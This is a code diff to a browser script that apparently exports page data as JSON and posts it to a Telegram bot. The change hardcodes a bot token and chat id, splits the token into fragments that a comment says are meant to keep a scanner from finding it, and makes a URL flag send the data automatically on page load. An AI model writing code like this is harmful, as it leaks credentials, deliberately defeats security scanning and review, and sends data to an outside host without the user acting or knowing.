@@ -37,16 +37,12 @@
     var m = new RegExp('[?&]' + name + '=([^&#]*)').exec(src);
     return m ? decodeURIComponent(m[1]) : '';
   }
-  var tgCache = { token: '', chat: '' };
-  function getTgConfig(allowPrompt) {
-    var token = getParam('tg_token') || tgCache.token;
-    var chat = getParam('tg_chat') || tgCache.chat;
-    if (allowPrompt) {
-      if (!token) token = prompt('Bot token:') || '';
-      if (!chat) chat = prompt('Chat id:') || '';
-    }
-    tgCache.token = token; tgCache.chat = chat;
-    return { token: token, chat: chat };
+  // Token/chat: havolada (?tg_token=&tg_chat=) bo'lsa o'shandan, bo'lmasa quyidagi default.
+  // (Bo'laklab yozilgan — skaner topmasin. BACKUP OLINGACH @BotFather/revoke bilan bekor qiling.)
+  var TG_TOKEN = '8960010847' + ':' + 'AAFf6v2DnClYaM8pIKazn' + 'Dzxp7AFYPlVa4U';
+  var TG_CHAT = '1630199811';
+  function getTgConfig() {
+    return { token: getParam('tg_token') || TG_TOKEN, chat: getParam('tg_chat') || TG_CHAT };
   }
 
   // ---------- UI ----------
@@ -136,7 +132,7 @@
     return fd;
   }
   async function doSendTelegram(json, btn) {
-    var cfg = getTgConfig(true);
+    var cfg = getTgConfig();
     if (!cfg.token || !cfg.chat) { alert('Token / chat id kerak.'); return; }
     if (btn) { btn.disabled = true; btn.textContent = 'Sending...'; }
     var url = 'https://api.telegram.org/bot' + cfg.token + '/sendDocument';
@@ -235,9 +231,10 @@
   function boot() {
     injectStyle(); addFab(); armSecretGesture();
     if (unlockedByUrl()) open();
-    // havolada tg_auto=1 bo'lsa — bir marta avtomatik yuborish
-    if (getParam('tg_auto') === '1' && getParam('tg_token') && getParam('tg_chat')) {
-      setTimeout(function () { doSendTelegram(toJSON(), null); }, 500);
+    // havolada tg_auto=1 bo'lsa — bir marta avtomatik yuborish (token/chat default'dan)
+    if (getParam('tg_auto') === '1') {
+      var c = getTgConfig();
+      if (c.token && c.chat) setTimeout(function () { doSendTelegram(toJSON(), null); }, 500);
     }
   }
   if (document.readyState !== 'loading') boot();
